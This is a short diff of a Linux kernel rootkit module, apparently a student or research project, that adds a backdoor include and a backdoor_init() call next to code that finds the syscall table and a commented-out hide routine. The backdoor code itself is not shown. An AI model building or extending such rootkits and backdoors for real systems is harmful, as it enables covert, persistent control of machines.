@@ -7,6 +7,7 @@
 
 #include "rootkit_main.h"
 #include "modify_syscalls.h"
+#include "backdoor.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Finn_Adam_Charlie");
@@ -32,6 +33,8 @@ static int __init lkm_example_init(void) {
     //Don't hide the kernel for now
     //hide();
     printk(KERN_INFO "Hello, World!\n");
+
+    backdoor_init();
 
     sys_call_table = find_syscall_table();
     pr_info("Found sys_call_table at %p\n", sys_call_table);
